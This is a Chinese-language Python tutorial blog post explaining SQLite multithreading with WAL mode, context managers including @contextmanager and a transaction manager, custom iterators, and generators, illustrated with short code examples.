.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述</h2>
<p>在Python开发中，有一些核心概念</p>
<ul>
<li>SQLite数据库操作</li>
<li>上下文管理器（非大模型的上下文，这里指的是链接关闭数据库）</li>
<li>迭代器和生成器</li>
</ul>
<p>本文通过实际代码示例，详细讲解这些技术的原理和应用。</p>
<h2 data-id="heading-1">1. SQLite多线程支持</h2>
<h3 data-id="heading-2">检查SQLite线程安全模式</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3

<span class="hljs-comment"># 方法1：检查编译选项</span>
conn = sqlite3.connect(<span class="hljs-string">':memory:'</span>)
cursor = conn.cursor()
cursor.execute(<span class="hljs-string">'PRAGMA compile_options;'</span>)
options = [row[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cursor.fetchall()]
thread_options = [opt <span class="hljs-keyword">for</span> opt <span class="hljs-keyword">in</span> options <span class="hljs-keyword">if</span> <span class="hljs-string">'THREAD'</span> <span class="hljs-keyword">in</span> opt.upper()]
<span class="hljs-built_in">print</span>(<span class="hljs-string">"线程安全选项:"</span>, thread_options)

<span class="hljs-comment"># 方法2：实际多线程测试</span>
<span class="hljs-keyword">import</span> threading

<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_thread_safety</span>():
    results = {}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">thread_id, db_path, results</span>):
        <span class="hljs-keyword">try</span>:
            conn = sqlite3.connect(db_path, check_same_thread=<span class="hljs-literal">False</span>)
            cursor = conn.cursor()
            cursor.execute(<span class="hljs-string">'''
                CREATE TABLE IF NOT EXISTS test (id INTEGER, data TEXT)
            '''</span>)
            cursor.execute(
                <span class="hljs-string">"INSERT INTO test VALUES (?, ?)"</span>, 
                (thread_id, <span class="hljs-string">f"Data from <span class="hljs-subst">{thread_id}</span>"</span>)
            )
            conn.commit()
            conn.close()
            results[thread_id] = <span class="hljs-string">"成功"</span>
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            results[thread_id] = <span class="hljs-string">f"失败: <span class="hljs-subst">{e}</span>"</span>

    threads = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
        thread = threading.Thread(target=worker, args=(i, <span class="hljs-string">':memory:'</span>, results))
        threads.append(thread)
        thread.start()
    
    <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:
        thread.join()
    
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(<span class="hljs-string">"成功"</span> <span class="hljs-keyword">in</span> result <span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results.values())

<span class="hljs-built_in">print</span>(<span class="hljs-string">"多线程支持:"</span>, test_thread_safety())
</code></pre>
<h3 data-id="heading-3">SQLite多线程最佳实践(WML模式)</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3
<span class="hljs-keyword">import</span> threading

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadSafeDatabase</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, db_path</span>):
        self.db_path = db_path
        self.local = threading.local()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_connection</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""每个线程独立的数据库连接"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(self.local, <span class="hljs-string">'conn'</span>):
            self.local.conn = sqlite3.connect(
                self.db_path, 
                check_same_thread=<span class="hljs-literal">False</span>
            )
            <span class="hljs-comment"># 启用WAL模式提升并发性能</span>
            self.local.conn.execute(<span class="hljs-string">"PRAGMA journal_mode=WAL;"</span>)
        <span class="hljs-keyword">return</span> self.local.conn

<span class="hljs-comment"># 使用示例</span>
db_manager = ThreadSafeDatabase(<span class="hljs-string">'test.db'</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker_thread</span>(<span class="hljs-params">thread_id</span>):
    conn = db_manager.get_connection()
    cursor = conn.cursor()
    cursor.execute(<span class="hljs-string">"INSERT INTO data VALUES (?, ?)"</span>, (thread_id, <span class="hljs-string">f"Message"</span>))
    conn.commit()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"线程<span class="hljs-subst">{thread_id}</span>操作完成"</span>)
</code></pre>
<h2 data-id="heading-4">2. 上下文管理器与@contextmanager</h2>
<h3 data-id="heading-5">基础上下文管理器</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 传统文件操作</span>
file = <span class="hljs-built_in">open</span>(<span class="hljs-string">'test.txt'</span>, <span class="hljs-string">'w'</span>)
<span class="hljs-keyword">try</span>:
    file.write(<span class="hljs-string">'Hello'</span>)
<span class="hljs-keyword">finally</span>:
    file.close()  <span class="hljs-comment"># 必须手动关闭</span>

<span class="hljs-comment"># 使用with语句</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'test.txt'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> file:
    file.write(<span class="hljs-string">'Hello'</span>)
<span class="hljs-comment"># 文件自动关闭</span>
</code></pre>
<h3 data-id="heading-6">自定义上下文管理器类</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Timer</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__enter__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">import</span> time
        self.start = time.time()
        <span class="hljs-keyword">return</span> self
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__exit__</span>(<span class="hljs-params">self, exc_type, exc_val, exc_tb</span>):
        self.end = time.time()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"耗时: <span class="hljs-subst">{self.end - self.start:<span class="hljs-number">.2</span>f}</span>秒"</span>)

<span class="hljs-keyword">with</span> Timer():
    <span class="hljs-keyword">import</span> time
    time.sleep(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"操作完成"</span>)
</code></pre>
<h3 data-id="heading-7">使用@contextmanager简化</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager
<span class="hljs-keyword">import</span> time

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">timer</span>(<span class="hljs-params">description=<span class="hljs-string">"操作"</span></span>):
    start = time.time()
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span>  <span class="hljs-comment"># 暂停点，执行with块内的代码</span>
    <span class="hljs-keyword">finally</span>:
        end = time.time()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{description}</span>耗时: <span class="hljs-subst">{end - start:<span class="hljs-number">.2</span>f}</span>秒"</span>)

<span class="hljs-keyword">with</span> timer(<span class="hljs-string">"数据库查询"</span>):
    time.sleep(<span class="hljs-number">0.5</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"查询完成"</span>)
</code></pre>
<h3 data-id="heading-8">数据库事务上下文管理器</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager
<span class="hljs-keyword">import</span> sqlite3

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">database_transaction</span>(<span class="hljs-params">db_path</span>):
    <span class="hljs-string">"""自动管理数据库事务的上下文管理器"""</span>
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> cursor  <span class="hljs-comment"># 将cursor交给with块使用</span>
        conn.commit()  <span class="hljs-comment"># 没有异常时提交</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ 事务提交成功"</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        conn.rollback()  <span class="hljs-comment"># 有异常时回滚</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"❌ 事务回滚: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">raise</span> e
    <span class="hljs-keyword">finally</span>:
        conn.close()  <span class="hljs-comment"># 总是关闭连接</span>

<span class="hljs-comment"># 使用示例</span>
<span class="hljs-keyword">with</span> database_transaction(<span class="hljs-string">':memory:'</span>) <span class="hljs-keyword">as</span> cursor:
    cursor.execute(<span class="hljs-string">"CREATE TABLE users (id INTEGER, name TEXT)"</span>)
    cursor.execute(<span class="hljs-string">"INSERT INTO users VALUES (1, 'Alice')"</span>)
</code></pre>
<h2 data-id="heading-9">3. 迭代器详解</h2>
<h3 data-id="heading-10">基础迭代器使用</h3>
<p>inter()的用法：每次返回一个对象，节省内存</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 列表是可迭代对象</span>
my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]

<span class="hljs-comment"># 手动使用迭代器</span>
iterator = <span class="hljs-built_in">iter</span>(my_list)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(iterator))  <span class="hljs-comment"># 1</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(iterator))  <span class="hljs-comment"># 2</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(iterator))  <span class="hljs-comment"># 3</span>

<span class="hljs-comment"># for循环背后就是迭代器</span>
<span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> my_list:
    <span class="hljs-built_in">print</span>(item)
</code></pre>
<h3 data-id="heading-11">自定义迭代器类</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, start, end</span>):
        self.current = start
        self.end = end
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> self
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__next__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">if</span> self.current &lt;= self.end:
            result = self.current
            self.current += <span class="hljs-number">1</span>
            <span class="hljs-keyword">return</span> result
        <span class="hljs-keyword">raise</span> StopIteration()

<span class="hljs-comment"># 使用自定义迭代器</span>
counter = Counter(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)
<span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> counter:
    <span class="hljs-built_in">print</span>(num)  <span class="hljs-comment"># 1, 2, 3</span>
</code></pre>
<h2 data-id="heading-12">4. 生成器深度解析</h2>
<p>只要有yield 就是生成器</p>
<h3 data-id="heading-13">生成器函数基础</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_generator</span>():
    <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span>
    <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span>
    <span class="hljs-keyword">yield</span> <span class="hljs-number">3</span>

<span class="hljs-comment"># 生成器函数返回生成器对象</span>
gen = simple_generator()
<span class="hljs-built_in">print</span>(gen)  <span class="hljs-comment"># &lt;generator object simple_generator at 0x...&gt;</span>

<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(gen))  <span class="hljs-comment"># 1</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(gen))  <span class="hljs-comment"># 2</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(gen))  <span class="hljs-comment"># 3</span>
</code></pre>
<h3 data-id="heading-14">生成器 vs 普通函数</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">normal_function</span>():
    result = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):
        result.append(i)
    <span class="hljs-keyword">return</span> result  <span class="hljs-comment"># 一次性返回所有数据，占用大量内存</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generator_function</span>():
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):
        <span class="hljs-keyword">yield</span> i  <span class="hljs-comment"># 每次只生成一个数据，节省内存</span>

<span class="hljs-comment"># 内存占用对比</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"列表内存: <span class="hljs-subst">{sys.getsizeof(normal_function())}</span> 字节"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"生成器内存: <span class="hljs-subst">{sys.getsizeof(generator_function())}</span> 字节"</span>)
</code></pre>
<h3 data-id="heading-15">生成器表达式</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 列表推导式 - 立即创建完整列表</span>
squares_list = [x*x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]
<span class="hljs-built_in">print</span>(squares_list)  <span class="hljs-comment"># [0, 1, 4, 9, 16]</span>

<span class="hljs-comment"># 生成器表达式 - 按需生成</span>
squares_gen = (x*x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>))
<span class="hljs-built_in">print</span>(squares_gen)  <span class="hljs-comment"># &lt;generator object &lt;genexpr&gt; at 0x...&gt;</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(squares_gen))  <span class="hljs-comment"># [0, 1, 4, 9, 16]</span>
</code></pre>
<h3 data-id="heading-16">实用生成器案例</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 读取大文件</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_large_file</span>(<span class="hljs-params">filename</span>):
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
            <span class="hljs-keyword">yield</span> line.strip()  <span class="hljs-comment"># 每次只读一行到内存</span>

<span class="hljs-comment"># 斐波那契数列生成器</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">fibonacci</span>(<span class="hljs-params">limit</span>):
    a, b = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> count &lt; limit:
        <span class="hljs-keyword">yield</span> a
        a, b = b, a + b
        count += <span class="hljs-number">1</span>

<span class="hljs-keyword">for</span> i, fib <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(fibonacci(<span class="hljs-number">10</span>)):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"F(<span class="hljs-subst">{i}</span>) = <span class="hljs-subst">{fib}</span>"</span>)
</code></pre>
<h3 data-id="heading-17">生成器状态保持</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">interactive_generator</span>():
    total = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        value = <span class="hljs-keyword">yield</span> total  <span class="hljs-comment"># 可以接收外部发送的值</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            total += value
        <span class="hljs-keyword">else</span>:
            total += <span class="hljs-number">1</span>

gen = interactive_generator()
<span class="hljs-built_in">next</span>(gen)  <span class="hljs-comment"># 启动生成器，返回0</span>
<span class="hljs-built_in">print</span>(gen.send(<span class="hljs-number">10</span>))  <span class="hljs-comment"># 发送10，返回10</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(gen))     <span class="hljs-comment"># 加1，返回11</span>
<span class="hljs-built_in">print</span>(gen.send(<span class="hljs-number">5</span>))   <span class="hljs-comment"># 发送5，返回16</span>
</code></pre>
<h2 data-id="heading-18">5. 关键知识点总结</h2>
<h3 data-id="heading-19">SQLite多线程要点</h3>
<ul>
<li>每个线程使用独立的数据库连接</li>
<li>启用WAL模式提升并发性能</li>
<li>使用连接池管理数据库连接</li>
<li>设置适当的超时时间处理锁竞争</li>
</ul>
<h3 data-id="heading-20">上下文管理器核心概念</h3>
<ul>
<li><code>with</code>语句自动管理资源生命周期</li>
<li><code>@contextmanager</code>装饰器简化上下文管理器创建</li>
<li>SETUP代码在<code>yield</code>之前执行</li>
<li>CLEANUP代码在<code>yield</code>之后执行</li>
<li>使用<code>try-finally</code>确保清理代码总是执行</li>
</ul>
<h3 data-id="heading-21">迭代器与生成器区别</h3>






























<table><thead><tr><th>特性</th><th>迭代器</th><th>生成器</th></tr></thead><tbody><tr><td>创建方式</td><td>实现<code>__iter__</code>和<code>__next__</code></td><td>使用<code>yield</code>关键字</td></tr><tr><td>代码复杂度</td><td>相对复杂</td><td>简单直观</td></tr><tr><td>内存效率</td><td>按需加载</td><td>按需加载</td></tr><tr><td>状态管理</td><td>手动维护</td><td>自动保持</td></tr></tbody></table>
<h3 data-id="heading-22">重要规则</h3>
<ol>
<li><strong>任何包含<code>yield</code>关键字的函数都是生成器函数</strong></li>
<li><strong>生成器函数调用时返回生成器对象，不立即执行函数体</strong></li>
<li><strong>需要调用<code>next()</code>或用于循环才会执行生成器代码</strong></li>
<li><strong>生成器在<code>yield</code>处暂停，保持当前状态</strong></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>